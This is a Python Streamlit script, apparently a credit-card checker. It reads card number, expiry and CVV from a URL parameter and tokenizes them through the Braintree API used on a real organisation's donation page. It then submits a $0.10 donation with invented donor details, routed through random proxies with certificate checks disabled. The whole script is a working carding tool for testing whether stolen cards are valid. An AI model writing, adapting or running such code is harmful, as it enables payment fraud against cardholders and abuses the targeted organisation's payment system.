import streamlit as st
import requests
import random
import urllib3
from bs4 import BeautifulSoup
import re
import base64
import json

# Suppress InsecureRequestWarning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- Global Variables ---
stored_values = {}
session = requests.Session()

# --- Helper Functions ---
def load_proxies(filename="proxies.txt"):
    """Loads proxies from a file."""
    proxies = []
    try:
        with open(filename, 'r') as f:
            for line in f:
                proxies.append(line.strip())
    except FileNotFoundError:
        pass # Silently continue without proxies
    return proxies

proxies_list = load_proxies()

def get_random_proxy():
    """Returns a random proxy if available, otherwise None."""
    if proxies_list:
        proxy_url = random.choice(proxies_list)
        return {
            "http": proxy_url,
            "https": proxy_url,
        }
    return None

def make_request(step_number, description, method, url, headers=None, data=None, json_data=None, params=None, cookies=None, allow_redirects=True):
    """Makes an HTTP request and returns the response object or None."""
    proxy = get_random_proxy()
    try:
        response = session.request(
            method,
            url,
            headers=headers,
            data=data,
            json=json_data,
            params=params,
            cookies=cookies, 
            proxies=proxy,
            verify=False,  # Corresponds to curl's --insecure or -k
            allow_redirects=allow_redirects
        )
        response.raise_for_status() 
        return response
    except requests.exceptions.RequestException as e:
        return None

# --- Main Execution ---
if __name__ == "__main__":
    st.title("cURL Request Processor")

    card_details_from_url = None
    raw_card_param = st.query_params.get("card")
    if raw_card_param:
        parts = raw_card_param.split('|')
        if len(parts) == 4:
            cc, mm, yy_or_yyyy, cvv = parts
            year = yy_or_yyyy
            if len(yy_or_yyyy) == 2:
                year = "20" + yy_or_yyyy
            card_details_from_url = {
                "number": cc,
                "expirationMonth": mm,
                "expirationYear": year,
                "cvv": cvv
            }

    # --- Request 2 ---
    # (No Streamlit output for this step)
    headers_step2 = {
        'Host': 'act.dsausa.org',
        'Sec-Ch-Ua-Platform': '"Windows"',
        'Accept-Language': 'en-US,en;q=0.9',
        'Sec-Ch-Ua': '"Chromium";v="135", "Not-A.Brand";v="8"',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
        'Sec-Ch-Ua-Mobile': '?0',
        'Accept': '*/*',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'no-cors',
        'Sec-Fetch-Dest': 'script',
        'Referer': 'https://act.dsausa.org/donate/donation',
        'Accept-Encoding': 'gzip, deflate, br',
    }
    params_step2 = {
        'callback': 'actionkit.forms.onContextLoaded',
        'form_name': 'act',
        'required': [
            'email', 'country', 'first_name', 'last_name', 'state', 'zip',
            'card_num', 'exp_date_month', 'exp_date_year', 'card_code'
        ],
        'r': '0.35705914930053106',
        'url': 'https://act.dsausa.org/donate/donation'
    }
    response_step2 = make_request(
        step_number=2,
        description="Get context and extract client_token",
        method="GET",
        url="https://act.dsausa.org/context/donation",
        headers=headers_step2,
        params=params_step2
    )

    if response_step2 and response_step2.text:
        soup = BeautifulSoup(response_step2.text, 'html.parser')
        script_content = soup.get_text()
        match = re.search(r'"client_token"\s*:\s*"([^"\s]+)"', script_content)
        if match:
            client_token = match.group(1)
            stored_values['client_token'] = client_token
            try:
                decoded_token_json = base64.b64decode(client_token).decode('utf-8')
                decoded_token_data = json.loads(decoded_token_json)
                if 'authorizationFingerprint' in decoded_token_data:
                    auth_fingerprint = decoded_token_data['authorizationFingerprint']
                    stored_values['authorizationFingerprint'] = auth_fingerprint
            except Exception as e:
                pass # Silently ignore errors

    # --- Request 3 ---
    # (No Streamlit output for this step)
    if 'authorizationFingerprint' in stored_values:
        headers_step3 = {
            'Host': 'payments.braintree-api.com',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'Authorization': f"Bearer {stored_values['authorizationFingerprint']}",
            'Braintree-Version': '2018-05-10',
            'Accept-Language': 'en-US,en;q=0.9',
            'Sec-Ch-Ua': '"Chromium";v="135", "Not-A.Brand";v="8"',
            'Sec-Ch-Ua-Mobile': '?0',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
            'Content-Type': 'application/json',
            'Accept': '*/*',
            'Origin': 'https://act.dsausa.org',
            'Sec-Fetch-Site': 'cross-site',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Referer': 'https://act.dsausa.org/',
            'Accept-Encoding': 'gzip, deflate, br',
            'Priority': 'u=1, i'
        }
        json_payload_step3 = {
            "clientSdkMetadata": {
                "source": "client",
                "integration": "custom",
                "sessionId": "5cd5ee4d-a4c1-4ca4-a81d-ee23dc44e8b1"
            },
            "query": "query ClientConfiguration { clientConfiguration { analyticsUrl environment merchantId assetsUrl clientApiUrl creditCard { supportedCardBrands challenges threeDSecureEnabled threeDSecure { cardinalAuthenticationJWT } } applePayWeb { countryCode currencyCode merchantIdentifier supportedCardBrands } googlePay { displayName supportedCardBrands environment googleAuthorization paypalClientId } ideal { routeId assetsUrl } kount { merchantId } masterpass { merchantCheckoutId supportedCardBrands } paypal { displayName clientId privacyUrl userAgreementUrl assetsUrl environment environmentNoNetwork unvettedMerchant braintreeClientId billingAgreementsEnabled merchantAccountId currencyCode payeeEmail } unionPay { merchantAccountId } usBankAccount { routeId plaidPublicKey } venmo { merchantId accessToken environment } visaCheckout { apiKey externalClientId supportedCardBrands } braintreeApi { accessToken url } supportedFeatures } }",
            "operationName": "ClientConfiguration"
        }
        response_step3 = make_request(
            step_number=3,
            description="POST to Braintree GraphQL API for client configuration",
            method="POST",
            url="https://payments.braintree-api.com/graphql",
            headers=headers_step3,
            json_data=json_payload_step3
        )

    # --- Request 4 ---
    # (No Streamlit output for this step)
    if 'authorizationFingerprint' in stored_values and card_details_from_url:
        headers_step4 = {
            'Host': 'payments.braintree-api.com',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'Authorization': f"Bearer {stored_values['authorizationFingerprint']}", 
            'Braintree-Version': '2018-05-10',
            'Accept-Language': 'en-US,en;q=0.9',
            'Sec-Ch-Ua': '"Chromium";v="135", "Not-A.Brand";v="8"',
            'Sec-Ch-Ua-Mobile': '?0',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
            'Content-Type': 'application/json',
            'Accept': '*/*',
            'Origin': 'https://assets.braintreegateway.com',
            'Sec-Fetch-Site': 'cross-site',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Referer': 'https://assets.braintreegateway.com/',
            'Accept-Encoding': 'gzip, deflate, br',
            'Priority': 'u=1, i'
        }
        json_payload_step4 = {
            "clientSdkMetadata": {
                "source": "client",
                "integration": "custom",
                "sessionId": "5cd5ee4d-a4c1-4ca4-a81d-ee23dc44e8b1"
            },
            "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }",
            "variables": {
                "input": {
                    "creditCard": card_details_from_url,
                    "options": {"validate": False}
                }
            },
            "operationName": "TokenizeCreditCard"
        }
        response_step4 = make_request(
            step_number=4,
            description="POST to Braintree GraphQL API to tokenize credit card",
            method="POST",
            url="https://payments.braintree-api.com/graphql",
            headers=headers_step4,
            json_data=json_payload_step4
        )
        if response_step4:
            try:
                response_json = response_step4.json()
                tokenized_card_token = response_json.get('data', {}).get('tokenizeCreditCard', {}).get('token')
                if tokenized_card_token:
                    stored_values['card_token'] = tokenized_card_token
            except Exception as e:
                pass # Silently ignore errors
    
    # --- Request 5 ---
    if 'card_token' in stored_values:
        headers_step5 = {
            'Host': 'act.dsausa.org',
            'Cache-Control': 'max-age=0',
            'Sec-Ch-Ua': '"Chromium";v="135", "Not-A.Brand";v="8"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'Accept-Language': 'en-US,en;q=0.9',
            'Origin': 'https://act.dsausa.org',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-User': '?1',
            'Sec-Fetch-Dest': 'document',
            'Referer': 'https://act.dsausa.org/donate/donation',
            'Accept-Encoding': 'gzip, deflate, br',
            'Priority': 'u=0, i'
        }
        data_step5 = {
            'page': 'donation',
            'orig_akid': 'None',
            'ak-donate-step': '1',
            'amount_other': '0.1',
            'donation_type': 'single',
            'first_name': 'Raju',
            'required': 'first_name',
            'last_name': 'Kaka',
            'address1': '112 Raju St.',
            'city': 'Los Angeles',
            'state': 'CA',
            'zip': '90012',
            'country': 'United States',
            'email': 'rajukind889@gmail.com',
            'phone': '',
            'action_donation_instructions': '',
            'payment_method': 'cc',
            'business_name': '',
            'paypal': '0',
            'form_name': 'act',
            'url': 'https://act.dsausa.org/donate/donation',
            'js': '1',
            'cookie_prefill': '{"nvtag":"Ro2YD4hJLO9PpFNQCD2zk2P2"}',
            'device_data': '{"device_session_id":"df9979f1032a46e2b64106e04ea20d06","fraud_merchant_id":null,"correlation_id":"40e873dbf2ecd7c15da842895fa7b05f"}',
            'payment_method_nonce': stored_values['card_token'],
            'card_prefix': '408911'
        }
        cookies_step5 = {
            '_ga_MRGNXNWSPT': 'GS2.1.s1748957410$o1$g0$t1748957410$j60$l0$h0',
            '_ga': 'GA1.2.1182139084.1748957410',
            '_gid': 'GA1.2.1486344061.1748957410',
            '_fbp': 'fb.1.1748957410549.817153865833305834'
        }
        response_step5 = make_request(
            step_number=5,
            description="POST form data for donation processing",
            method="POST",
            url="https://act.dsausa.org/act/",
            headers=headers_step5,
            data=data_step5,
            cookies=cookies_step5,
            allow_redirects=False
        )
        if response_step5:
            location = response_step5.headers.get('Location')
            if location:
                st.write(location)
            # else: # Optionally, indicate if Location header was not found
                # st.write("Final redirect location not found.")

# --- Request Definitions will be added below --- 
